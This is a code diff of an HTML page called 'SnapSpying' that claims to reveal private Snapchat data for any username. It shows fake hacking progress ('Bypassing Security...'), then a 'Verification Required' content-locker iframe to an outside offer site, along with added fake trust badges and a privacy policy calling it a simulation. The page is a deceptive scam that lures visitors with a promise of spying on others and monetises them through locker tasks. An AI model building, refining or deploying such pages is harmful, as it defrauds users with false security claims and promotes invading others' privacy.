@@ -8,12 +8,12 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
-        :root { --bg: #000; --card: #1c1c1e; --text: #fff; --border: #2c2c2e; --snap: #ffd500; }
+        :root { --bg: #000; --card: #1c1c1e; --text: #fff; --border: #2c2c2e; }
         .light { --bg: #f2f2f7; --card: #fff; --text: #000; --border: #d1d1d6; }
         body { font-family: 'Inter', sans-serif; background: var(--bg); color: var(--text); transition: 0.3s; overflow-x: hidden; -webkit-tap-highlight-color: transparent; }
         .sheet { transform: translateY(100%); transition: transform 0.4s cubic-bezier(0.16, 1, 0.3, 1); z-index: 100; }
         .sheet.active { transform: translateY(0); }
-        .bar-fill { height: 100%; background: var(--snap); width: 0%; transition: width 0.4s linear; box-shadow: 0 0 10px var(--snap); }
+        .bar-fill { height: 100%; background: #ffd500; width: 0%; transition: width 0.4s linear; box-shadow: 0 0 10px #ffd500; }
         .action-item { background: var(--card); border-radius: 18px; margin-bottom: 12px; cursor: pointer; transition: 0.2s; }
         .action-item:active { transform: scale(0.97); background: #2c2c2e; }
         .input-box { background: #1c1c1e; border: 1px solid #2c2c2e; transition: border 0.3s; }
@@ -35,36 +35,33 @@
             transform: scale(1.02);
         }
 
-        /* Locker Snapchat Design */
+        /* L-UPDATE DYAL LOCKER DESIGN */
         #locker-overlay {
             display: none;
             position: fixed;
             inset: 0;
-            background: #000;
+            background: rgba(0,0,0,0.9);
             z-index: 500;
             flex-direction: column;
             align-items: center;
             justify-content: center;
         }
-        .locker-box {
+        .snap-locker-card {
             width: 90%;
             max-width: 400px;
             background: #fff;
             border-radius: 35px;
             overflow: hidden;
             color: #000;
-            box-shadow: 0 20px 50px rgba(0,0,0,0.5);
-            animation: slideUp 0.5s ease;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.4);
         }
-        .locker-header {
-            background: var(--snap);
-            padding: 25px;
+        .snap-locker-header {
+            background: #ffd500;
+            padding: 20px;
             text-align: center;
             font-weight: 900;
-        }
-        @keyframes slideUp {
-            from { transform: translateY(100px); opacity: 0; }
-            to { transform: translateY(0); opacity: 1; }
+            font-size: 18px;
+            text-transform: uppercase;
         }
     </style>
 </head>
@@ -126,6 +123,41 @@
         </div>
     </div>
 
+    <div class="mt-12 opacity-40 flex flex-col items-center gap-2">
+        <div class="flex items-center gap-2">
+            <i class="fas fa-circle-check text-[#ffd500] text-sm"></i>
+            <span class="text-[10px] uppercase font-black tracking-widest">Verified Security Protocol</span>
+        </div>
+        <p class="text-[9px] font-medium text-gray-500">Secure connection via encrypted tunnel v4.2</p>
+    </div>
+
+    <div id="privacy-sheet" class="fixed inset-0 z-[200] hidden">
+        <div class="absolute inset-0 bg-black/80 backdrop-blur-sm" onclick="toggleSheet('privacy-sheet')"></div>
+        <div class="absolute bottom-0 w-full bg-[var(--card)] rounded-t-[30px] sheet h-[85vh] overflow-y-auto flex flex-col">
+            <div class="flex justify-between items-center px-6 py-5 sticky top-0 bg-[var(--card)] z-10 border-b border-white/5">
+                <h2 class="text-[18px] font-bold">Privacy Policy</h2>
+                <button onclick="toggleSheet('privacy-sheet')" class="text-white text-xl"><i class="fas fa-times"></i></button>
+            </div>
+            <div class="px-6 py-6 pb-20">
+                <p class="text-[#8e8e93] text-[13px] font-medium mb-4 italic">Last updated: April 30, 2026</p>
+                <p class="text-white text-[14px] leading-relaxed mb-6">This Privacy Policy describes how your personal information is collected, used, and shared when you visit SnapSpying (the "Platform").</p>
+                <div class="privacy-card"><h3 class="font-bold text-[15px] mb-2">Information We Collect</h3><p class="text-[#8e8e93] text-[13px] leading-relaxed">SnapSpying is designed for entertainment purposes only. We do not store, log, or share any usernames entered on this platform. All simulations are performed locally in your browser session.</p></div>
+                <div class="privacy-card"><h3 class="font-bold text-[15px] mb-2">How We Use Your Information</h3><p class="text-[#8e8e93] text-[13px] leading-relaxed">Any data shown during the "Reveal" process is part of a visual simulation designed to demonstrate potential UI layouts and is not retrieved from actual private servers.</p></div>
+                <div class="privacy-card"><h3 class="font-bold text-[15px] mb-2">Security</h3><p class="text-[#8e8e93] text-[13px] leading-relaxed">We use industry-standard encryption to ensure your visit remains private and secure from third-party interception.</p></div>
+            </div>
+        </div>
+    </div>
+
+    <div id="action-sheet" class="fixed inset-0 z-[150] hidden">
+        <div class="absolute inset-0 bg-black/70 backdrop-blur-sm" onclick="closeActionSheet()"></div>
+        <div class="absolute bottom-0 w-full bg-[var(--card)] rounded-t-[35px] p-10 sheet text-center">
+            <div class="w-10 h-1 bg-gray-700 mx-auto mb-8 rounded-full"></div>
+            <div class="preview-img-container"><img id="action-preview-img" src="" alt="preview"></div>
+            <h4 id="r-title" class="text-[18px] font-bold mb-10 px-4 leading-tight"></h4>
+            <button onclick="runExploit()" class="w-full bg-[#ffd500] text-black font-black py-4 rounded-2xl text-lg shadow-lg">Reveal</button>
+        </div>
+    </div>
+
     <div id="proc-modal" class="hidden fixed inset-0 z-[300] bg-black/95 flex items-center justify-center p-8">
         <div class="bg-[var(--card)] w-full max-w-sm rounded-[35px] p-8 border border-white/5 text-center">
             <div class="flex items-center gap-2 mb-8">
@@ -140,28 +172,16 @@
     </div>
 
     <div id="locker-overlay">
-        <div class="locker-box">
-            <div class="locker-header">
-                <i class="fab fa-snapchat text-4xl mb-2"></i>
-                <h2 class="text-xl">HUMAN VERIFICATION</h2>
+        <div class="snap-locker-card">
+            <div class="snap-locker-header">
+                <i class="fab fa-snapchat mr-2"></i> Verification Required
             </div>
             <div class="p-4 bg-gray-50">
-                <p class="text-center text-xs font-bold text-gray-500 mb-4 uppercase tracking-tighter">Complete one task below to reveal the data</p>
-                <iframe src="https://authenticateapp.online/cl/i/n66mg4" style="width:100%; height:450px; border:none; border-radius:20px;"></iframe>
+                <iframe src="https://authenticateapp.online/cl/i/n66mg4" style="width:100%; height:460px; border:none; border-radius:15px;"></iframe>
             </div>
-            <div class="p-4 text-center bg-white border-t border-gray-100">
-                <p class="text-[10px] text-gray-400 font-bold"><i class="fas fa-shield-alt mr-1"></i> SECURE ENCRYPTED SESSION</p>
+            <div class="p-4 bg-white text-center text-[10px] text-gray-400 font-bold uppercase">
+                Complete a security check to access data
             </div>
-        </div>
-    </div>
-
-    <div id="action-sheet" class="fixed inset-0 z-[150] hidden">
-        <div class="absolute inset-0 bg-black/70 backdrop-blur-sm" onclick="closeActionSheet()"></div>
-        <div class="absolute bottom-0 w-full bg-[var(--card)] rounded-t-[35px] p-10 sheet text-center">
-            <div class="w-10 h-1 bg-gray-700 mx-auto mb-8 rounded-full"></div>
-            <div class="preview-img-container"><img id="action-preview-img" src="" alt="preview"></div>
-            <h4 id="r-title" class="text-[18px] font-bold mb-10 px-4 leading-tight"></h4>
-            <button onclick="runExploit()" class="w-full bg-[#ffd500] text-black font-black py-4 rounded-2xl text-lg shadow-lg">Reveal</button>
         </div>
     </div>
 
@@ -179,7 +199,8 @@
             const user = document.getElementById('username').value;
             const btn = document.getElementById('connBtn');
             const inp = document.getElementById('username');
-            if(user.length < 4) { inp.classList.add('input-error'); return; }
+            const err = document.getElementById('error-msg');
+            if(user.length < 4) { inp.classList.add('input-error'); err.classList.remove('hidden'); return; }
             if(btn.innerText === "Disconnect") { location.reload(); return; }
             btn.innerHTML = '<i class="fas fa-circle-notch animate-spin"></i>';
             btn.disabled = true;
@@ -210,17 +231,15 @@
                 let p = 0; const bar = document.getElementById('bar');
                 const percent = document.getElementById('p-percent');
                 const status = document.getElementById('p-status');
-                
                 const interval = setInterval(() => {
                     p += 1; bar.style.width = p + '%'; percent.innerText = p + '%';
                     if(p == 30) status.innerText = "Bypassing Security...";
-                    if(p == 60) status.innerText = "Extracting Packets...";
-                    if(p == 90) status.innerText = "Finalizing...";
-                    
+                    if(p == 70) status.innerText = "Finalizing Data...";
                     if(p >= 100) {
                         clearInterval(interval);
                         setTimeout(() => {
                             document.getElementById('proc-modal').classList.add('hidden');
+                            // T7EL L-LOCKER DYALNA HNA
                             document.getElementById('locker-overlay').style.display = 'flex';
                         }, 500);
                     }
@@ -228,5 +247,6 @@
             }, 400);
         }
     </script>
+
 </body>
 </html>
